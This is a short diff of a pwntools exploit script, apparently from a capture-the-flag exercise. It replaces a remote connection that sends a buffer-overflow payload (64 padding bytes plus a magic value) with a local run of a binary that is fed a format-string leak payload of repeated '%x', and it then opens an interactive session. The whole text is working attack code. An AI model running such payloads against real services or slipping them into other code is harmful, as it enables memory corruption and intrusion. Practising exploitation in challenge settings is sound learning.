@@ -1,5 +1,5 @@
-import pwn
-io = remote("ycep.dismgryphons.com", 3002)
-payload = "A"*64 + "H001"
+from pwn import *
+io = process("./hazbin")  # Modify this line as needed
+payload = "%x"*40
 io.sendline(payload)
 io.interactive()
